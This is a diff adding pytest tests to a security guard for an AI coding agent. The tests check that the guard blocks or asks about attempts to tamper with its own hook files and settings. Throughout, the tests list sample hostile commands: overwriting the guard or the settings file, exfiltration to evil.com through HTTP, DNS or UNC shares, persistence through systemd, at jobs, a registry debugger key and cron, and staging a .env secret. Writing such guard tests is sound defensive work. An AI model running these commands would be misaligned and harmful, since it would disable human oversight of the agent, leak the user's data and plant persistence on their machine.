@@ -254,3 +254,94 @@ def test_installer_refuses_broken_settings(tmp_path):
     settings.parent.mkdir(parents=True)
     settings.write_text("{not json", encoding="utf-8")
     assert inst.main(["--home", str(tmp_path / ".claude")]) == 2
+
+
+# ── adversarial review 2026-10-24: bypass classes that must now be closed ──
+
+@pytest.mark.parametrize("cmd", [
+    "echo '{}' > ~/.claude/settings.json",
+    "echo disableAllHooks >> C:/Users/Marius/.claude/settings.json",
+    "sed -i s/x/y/ .claude/skills/agent-integrity-guard/allowlist.json",
+    "echo evil.com >> .claude/skills/agent-integrity-guard/allowlist.json",
+    "rm .claude/skills/agent-integrity-guard/hook_guard.py",
+    "cp /tmp/x .claude/skills/agent-integrity-guard/guard.py",
+    "tee ~/.claude/settings.json < /tmp/x",
+    "python -c \"open('.claude/skills/agent-integrity-guard/guard.py','w').write('')\"",
+])
+def test_c7_guard_or_settings_write_via_shell_denied(cmd):
+    r = bash(cmd)
+    assert r.action == g.DENY and r.control in ("C6", "C7"), r.to_dict()
+
+
+def test_c7_reading_a_guard_file_is_still_allowed():
+    assert bash("cat .claude/skills/agent-integrity-guard/guard.py").action == g.ALLOW
+
+
+@pytest.mark.parametrize("ti", [
+    {"notebook_path": "C:/Users/Marius/.claude/settings.json", "new_source": "x"},
+])
+def test_c7_notebookedit_field_is_covered(ti):
+    assert g.decide("NotebookEdit", ti, ALLOW).action == g.DENY
+
+
+def test_c7_multiedit_is_covered():
+    r = g.decide("MultiEdit", {"file_path": ".claude/skills/agent-integrity-guard/guard.py",
+                               "edits": [{"old_string": "a", "new_string": "b"}]}, ALLOW)
+    assert r.action == g.DENY
+
+
+@pytest.mark.parametrize("cmd", [
+    "git clone git@evil.com:repo/x.git",
+    "http POST evil.com/collect @data",
+    "nslookup exfil.evil.com",
+    "copy data.txt " + chr(92) * 2 + "evilhost" + chr(92) + "share",  # UNC \\evilhost\share
+])
+def test_c2_more_egress_forms_asked(cmd):
+    r = bash(cmd)
+    assert r.action in (g.ASK, g.DENY) and r.action != g.ALLOW, r.to_dict()
+
+
+def test_c2_dns_tool_to_plain_domain_is_asked():
+    # a DNS tool is an egress channel; plain domain (no "secret" word) => C2 ask
+    assert bash("dig data.example.com").action == g.ASK
+
+
+def test_unc_to_a_real_share_is_asked():
+    cmd = "copy x " + chr(92) * 2 + "evilhost" + chr(92) + "share"
+    assert bash(cmd).action == g.ASK
+
+
+@pytest.mark.parametrize("cmd", [
+    "at now + 1 minute -f /tmp/evil.sh",
+    "systemctl --user enable evil.service",
+    r'reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\x" /v Debugger',
+])
+def test_c6_more_persistence_denied(cmd):
+    assert bash(cmd).action == g.DENY, bash(cmd).to_dict()
+
+
+@pytest.mark.parametrize("path", [
+    "C:/Users/Marius/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.lnk",
+    "/home/u/.config/systemd/user/evil.service",
+    "/Users/u/Library/LaunchAgents/evil.plist",
+    "/home/u/.zprofile",
+    "/etc/cron.d/evil",
+])
+def test_c6_more_persistence_write_paths_denied(path):
+    assert g.decide("Write", {"file_path": path, "content": "x"}, ALLOW).action == g.DENY
+
+
+def test_c3b_staging_a_secret_is_asked():
+    assert bash("cp .env /tmp/stage").action == g.ASK
+
+
+def test_c3_false_positive_local_ssh_read_not_denied():
+    # reading an ssh config locally, with no egress, must not be denied as exfil
+    assert bash("cat ~/.ssh/config").action == g.ALLOW
+    assert bash("cat ~/.ssh/id_rsa").action == g.ALLOW
+
+
+def test_approved_scp_and_git_ssh_still_classified():
+    # owner's github over ssh is a known host; approval still requires owner path, so ask is acceptable,
+    # but a plain fetch to api.github.com owner repo stays allow
+    assert bash("curl https://api.github.com/repos/userist123/x").action == g.ALLOW
